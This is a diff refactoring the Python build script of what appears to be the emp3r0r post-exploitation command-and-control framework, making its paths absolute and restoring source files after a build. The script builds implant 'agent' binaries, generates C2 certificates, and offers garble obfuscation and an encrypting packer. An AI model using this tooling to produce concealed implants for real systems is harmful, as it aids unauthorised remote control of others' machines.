@@ -142,7 +142,7 @@ class GoBuild:
             )
             self.CA = CACHED_CONF["ca"]
         else:
-            with open("./tls/rootCA.crt", encoding="utf-8") as f:
+            with open(f"{PWD}/tls/rootCA.crt", encoding="utf-8") as f:
                 self.CA = f.read()
 
             # cache CA, too
@@ -152,67 +152,71 @@ class GoBuild:
         with open(BUILD_JSON, "w+", encoding="utf-8") as json_file:
             json.dump(CACHED_CONF, json_file, indent=4)
 
-        self.set_tags()
-
-        # copy the server/cc keypair to ./build for later use
-
-        if os.path.isdir("./tls"):
-            log_warn("[*] Copying CC keypair to ./build")
-
-            for f in glob.glob("./tls/emp3r0r-*pem"):
-                print(f" Copy {f} to ./build")
-                shutil.copy(f, "./build")
-
         try:
-            os.chdir(f"./cmd/{self.target}")
-        except BaseException:
-            log_error(f"Cannot cd to cmd/{self.target}")
+            self.set_tags()
 
-            return
+            # copy the server/cc keypair to ./build for later use
 
-        log_warn("GO BUILD starts...")
-        log_warn("------------------")
-        build_target = f"../../build/{self.target}"
+            if os.path.isdir(f"{PWD}/tls"):
+                log_warn("[*] Copying CC keypair to ./build")
 
-        if self.target == "agent":
-            build_target = f"../../build/{self.target}-{self.UUID}"
-        elif self.target == "agentw":
-            build_target = f"../../build/{self.target}-{self.UUID}.exe"
+                for f in glob.glob(f"{PWD}/tls/emp3r0r-*pem"):
+                    print(f" Copy {f} to ./build")
+                    shutil.copy(f, f"{PWD}/build")
 
-        # go mod
+            try:
+                os.chdir(f"{PWD}/cmd/{self.target}")
+            except BaseException:
+                log_error(f"Cannot cd to cmd/{self.target}")
 
-        if os.system("go mod tidy") != 0:
-            if yes_no("go mod tidy failed, goodbye?"):
-                sys.exit(1)
+                return
 
-        cmd = (
-            f"""GOOS={self.GOOS} GOARCH={self.GOARCH} CGO_ENABLED=0"""
-            + f""" go build -o {build_target} -ldflags='-s -w -v' -trimpath"""
-        )
+            log_warn("GO BUILD starts...")
+            log_warn("------------------")
+            build_target = f"{PWD}/build/{self.target}"
 
-        # garble
+            if self.target == "agent":
+                build_target = f"{PWD}/build/{self.target}-{self.UUID}"
+            elif self.target == "agentw":
+                build_target = f"{PWD}/build/{self.target}-{self.UUID}.exe"
 
-        if shutil.which("garble") and self.target.startswith("agent"):
-            if yes_no("Use garble to obfuscate agent binary?"):
-                cmd = (
-                    f"""GOOS={self.GOOS} GOARCH={self.GOARCH} CGO_ENABLED=0 GOPRIVATE="""
-                    + f""" garble -literals -tiny build -o {build_target} -ldflags="-v" -trimpath ."""
-                )
-                log_warn("Using garble to build agent binary")
+            # go mod
 
-        log_warn("GO BUILD ends...")
-        log_warn("----------------")
+            if os.system("go mod tidy") != 0:
+                if yes_no("go mod tidy failed, goodbye?"):
+                    sys.exit(1)
 
-        if os.system(cmd) != 0:
-            log_error(f"failed to build {self.target}")
+            cmd = (
+                f"""GOOS={self.GOOS} GOARCH={self.GOARCH} CGO_ENABLED=0"""
+                + f""" go build -o {build_target} -ldflags='-s -w -v' -trimpath"""
+            )
 
-            if yes_no("Goodbye?"):
-                sys.exit(1)
+            # garble
 
-        os.chdir("../../")
-        self.unset_tags()
+            if shutil.which("garble") and self.target.startswith("agent"):
+                if yes_no("Use garble to obfuscate agent binary?"):
+                    cmd = (
+                        f"""GOOS={self.GOOS} GOARCH={self.GOARCH} CGO_ENABLED=0 GOPRIVATE="""
+                        + f""" garble -literals -tiny build -o {build_target} -ldflags="-v" -trimpath ."""
+                    )
+                    log_warn("Using garble to build agent binary")
 
-        targetFile = f"./build/{build_target.split('/')[-1]}"
+            log_warn("GO BUILD ends...")
+            log_warn("----------------")
+
+            if os.system(cmd) != 0:
+                log_error(f"failed to build {self.target}")
+
+                if yes_no("Goodbye?"):
+                    sys.exit(1)
+
+            os.chdir(PWD)
+        except (KeyboardInterrupt, EOFError, SystemError, SystemExit):
+            log_error("Aborted")
+        finally:
+            self.unset_tags()
+
+        targetFile = f"{PWD}/build/{build_target.split('/')[-1]}"
 
         if os.path.exists(targetFile):
             log_success(f"{targetFile} generated")
@@ -221,21 +225,21 @@ class GoBuild:
             sys.exit(1)
 
         if self.target == "agent" and args.dll and not args.pack:
-            os.chdir("../loader/elf")
+            os.chdir(f"{PWD}/loader/elf")
             os.system("make")
-            shutil.move("loader.so", "../../core/build/loader.so")
-            os.chdir("../../core")
+            shutil.move("loader.so", f"{PWD}/core/build/loader.so")
+            os.chdir(PWD)
             log_success("loader.so can be found under ./build")
 
         if self.target == "agent" and yes_no(
             "Use packer to compress and encrypt agent binary?"
         ):
-            shutil.copy(targetFile, "../packer/agent")
-            os.chdir("../packer")
+            shutil.copy(targetFile, f"{PWD}/../packer/agent")
+            os.chdir(f"{PWD}/../packer")
             os.system("bash ./build.sh")
             os.system("CGO_ENABLED=0 ./cryptor.exe")
-            shutil.move("agent.packed.exe", f"../core/{targetFile}")
-            os.chdir("../core")
+            shutil.move("agent.packed.exe", targetFile)
+            os.chdir(PWD)
             os.chmod(targetFile, 0o755)
 
             log_success(f"{targetFile} packed")
@@ -247,19 +251,19 @@ class GoBuild:
 
         if "cc_host" in CACHED_CONF:
             if self.CCHost == CACHED_CONF["cc_host"] and os.path.exists(
-                "./build/emp3r0r-key.pem"
+                f"{PWD}/build/emp3r0r-key.pem"
             ):
                 return
 
         log_warn("[!] Generating new certs...")
         try:
-            os.chdir("./tls")
+            os.chdir(f"{PWD}/tls")
             os.system(
                 f"bash ./genkey-with-ip-san.sh {self.UUID} {self.UUID}.com {self.CCHost} {self.CC_OTHER_NAMES}"
             )
             os.rename(f"./{self.UUID}-cert.pem", "./emp3r0r-cert.pem")
             os.rename(f"./{self.UUID}-key.pem", "./emp3r0r-key.pem")
-            os.chdir("..")
+            os.chdir(PWD)
         except BaseException as exc:
             log_error(f"[-] Something went wrong, see above for details: {exc}")
             sys.exit(1)
@@ -271,12 +275,14 @@ class GoBuild:
 
         # backup source file
         try:
-            shutil.copy("./lib/tun/tls.go", "/tmp/tls.go")
-            shutil.copy("./lib/tun/api.go", "/tmp/api.go")
-            shutil.copy("./lib/data/def.go", "/tmp/def.go")
+            shutil.copy(f"{PWD}/lib/tun/tls.go", "/tmp/tls.go")
+            shutil.copy(f"{PWD}/lib/tun/api.go", "/tmp/api.go")
+            shutil.copy(f"{PWD}/lib/data/def.go", "/tmp/def.go")
         except BaseException:
             log_error(f"Failed to backup source files:\n{traceback.format_exc()}")
             sys.exit(1)
+
+        os.chdir(PWD)
 
         # CA
         sed("./lib/tun/tls.go", "[emp3r0r_ca]", self.CA)
@@ -426,13 +432,17 @@ class GoBuild:
         )
 
     def unset_tags(self):
+        log_warn("Trying to restore files...")
         # restore source files
         try:
-            shutil.move("/tmp/def.go", "./lib/data/def.go")
-            shutil.move("/tmp/tls.go", "./lib/tun/tls.go")
-            shutil.move("/tmp/api.go", "./lib/tun/api.go")
+            log_warn(shutil.move("/tmp/def.go", f"{PWD}/lib/data/def.go"))
+            log_warn(shutil.move("/tmp/tls.go", f"{PWD}/lib/tun/tls.go"))
+            log_warn(shutil.move("/tmp/api.go", f"{PWD}/lib/tun/api.go"))
         except BaseException:
-            log_error(traceback.format_exc())
+            log_error(f"Failed to restore files:\n{traceback.format_exc()}")
+        finally:
+            yes_no("Make sure Go source files are restored")
+            os.chdir(PWD)
 
 
 def clean():
@@ -467,7 +477,7 @@ def sed(path, old, new):
     """
     works like `sed -i s/old/new/g file`
     """
-    log_warn(f"sed -i s/{old}/{new}/g {path}")
+    log_warn(f"{path}: {old}  ->  {new}")
     with open(path, encoding="utf-8") as rf:
         text = rf.read()
         to_write = text.replace(old, new)
@@ -653,8 +663,11 @@ def save(prev_h_len, hfile):
     readline.append_history_file(new_h_len - prev_h_len, hfile)
 
 
+# remember working directory
+PWD = os.getcwd()
+
 # JSON config file, cache some user data
-BUILD_JSON = "./build/build.json"
+BUILD_JSON = f"{PWD}/build/build.json"
 CACHED_CONF = {}
 
 if os.path.exists(BUILD_JSON):
@@ -732,11 +745,11 @@ if args.yes:
 try:
     randomize_ports()
 
-    if not os.path.exists("./build"):
-        os.mkdir("./build")
+    if not os.path.exists(f"{PWD}/build"):
+        os.mkdir(f"{PWD}/build")
 
     # support GNU readline interface, command history
-    histfile = "./build/.build_py_history"
+    histfile = f"{PWD}/build/.build_py_history"
     try:
         readline.read_history_file(histfile)
         h_len = readline.get_current_history_length()
